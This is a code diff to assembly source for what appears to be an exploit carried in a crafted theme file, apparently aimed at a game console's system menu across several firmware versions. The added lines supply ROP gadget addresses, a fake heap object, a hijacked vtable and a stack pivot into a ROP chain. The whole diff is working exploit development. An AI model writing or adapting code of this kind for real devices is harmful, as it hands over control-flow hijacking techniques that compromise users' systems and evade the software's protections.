@@ -17,6 +17,10 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define HEAPBUF 0x35052080
 
+#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)
+#define ROP_LOADR4_FROMOBJR0 0x10b574 //Addr for v9.3-v9.4 is 0x10b574, 0x10b64c for older versions. load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
+#define ROP_POPPC 0x10203c //Addr for v9.3-v9.4 is 0x10203c, 0x102028 for older versions.
+
 _start:
 
 themeheader:
@@ -30,6 +34,12 @@ object:
 .word 0 @ Memchunk-hdr stuff writes here.
 .word 0
 
+.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+
+.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
+.word HEAPBUF + (ropstackstart - _start) @ sp
+.word ROP_POPPC @ pc
+
 .space ((object + 0x28) - .)
 .word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
 
@@ -40,9 +50,12 @@ object:
 .word HEAPBUF + (object - _start) @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
 
 vtable:
-.word 0x50504f52, 0x50504f53, 0x50504f54, 0x50504f55, 0x50504f56 @ vtable+0
-
-.word 0x58584148, 0x58584149, 0x5858414a, 0x5858414b, 0x5858414c, 0x5858414d, 0x5858414e
+.word 0, 0 @ vtable+0
+.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +8
+.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 
 .space ((vtable + 0x100) - .)
+
+ropstackstart:
+.word 0x58584148
 
